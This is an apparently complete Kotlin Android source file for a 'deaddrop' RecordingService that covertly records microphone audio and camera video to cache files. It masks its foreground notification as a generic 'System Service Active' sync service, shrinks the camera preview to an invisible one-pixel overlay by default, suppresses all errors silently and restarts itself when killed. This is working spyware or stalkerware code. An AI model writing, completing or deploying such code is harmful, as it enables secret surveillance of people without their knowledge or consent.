package com.example.deaddrop

import android.app.*
import android.content.*
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.media.*
import android.os.*
import android.util.Log
import android.view.*
import androidx.core.app.NotificationCompat
import java.io.File

class RecordingService : Service() {
    private var audioRecorder: MediaRecorder? = null
    private var videoRecorder: MediaRecorder? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null

    private lateinit var windowManager: WindowManager
    private var floatingView: View? = null
    private var isRecordingStarted = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val channelId = "DeaddropCapture"
        val channel = NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)

        startForeground(1, NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service Active")
            .setSmallIcon(android.R.drawable.ic_menu_manage).build())

        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        val showPreview = intent?.getBooleanExtra("SHOW_PREVIEW", false) ?: false
        setupFloatingPreview(showPreview)

        startAudioCapture()
        return START_STICKY
    }

    private fun setupFloatingPreview(visible: Boolean) {
        val size = if (visible) 400 else 1
        val params = WindowManager.LayoutParams(
            size, size,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 100
            y = 100
        }

        val surfaceView = SurfaceView(this)
        floatingView = surfaceView
        try { windowManager.addView(floatingView, params) } catch (e: Exception) {}

        surfaceView.holder.addCallback(object : SurfaceHolder.Callback {
            override fun surfaceCreated(holder: SurfaceHolder) { startVideoCapture(holder.surface) }
            override fun surfaceChanged(holder: SurfaceHolder, format: Int, w: Int, h: Int) {}
            override fun surfaceDestroyed(holder: SurfaceHolder) {}
        })
    }

    private fun startAudioCapture() {
        audioRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setOutputFile(File(cacheDir, "drop_audio.mp4").absolutePath)
            try { prepare(); start() } catch (e: Exception) {}
        }
    }

    private fun startVideoCapture(previewSurface: Surface) {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = manager.cameraIdList[0]
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    prepareVideoRecorder()
                    startVideoRecording(previewSurface)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, null)
        } catch (e: Exception) {}
    }

    private fun prepareVideoRecorder() {
        videoRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }.apply {
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setVideoEncodingBitRate(800000)
            setVideoFrameRate(24)
            setVideoSize(640, 480)
            setOutputFile(File(cacheDir, "drop_video.mp4").absolutePath)
            try { prepare() } catch (e: Exception) {}
        }
    }

    private fun startVideoRecording(previewSurface: Surface) {
        val recordSurface = videoRecorder?.surface ?: return
        cameraDevice?.createCaptureSession(listOf(previewSurface, recordSurface), object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(session: CameraCaptureSession) {
                captureSession = session
                val builder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                builder?.addTarget(previewSurface)
                builder?.addTarget(recordSurface)
                try {
                    session.setRepeatingRequest(builder!!.build(), null, null)
                    videoRecorder?.start()
                    isRecordingStarted = true
                } catch (e: Exception) {}
            }
            override fun onConfigureFailed(s: CameraCaptureSession) {}
        }, null)
    }

    override fun onDestroy() {
        try {
            if (isRecordingStarted) {
                audioRecorder?.stop()
                videoRecorder?.stop()
            }
        } catch (e: Exception) {} finally {
            audioRecorder?.release()
            videoRecorder?.release()
            captureSession?.close()
            cameraDevice?.close()
            if (floatingView != null) windowManager.removeView(floatingView)
        }
        super.onDestroy()
    }

    override fun onBind(intent: Intent?) = null
}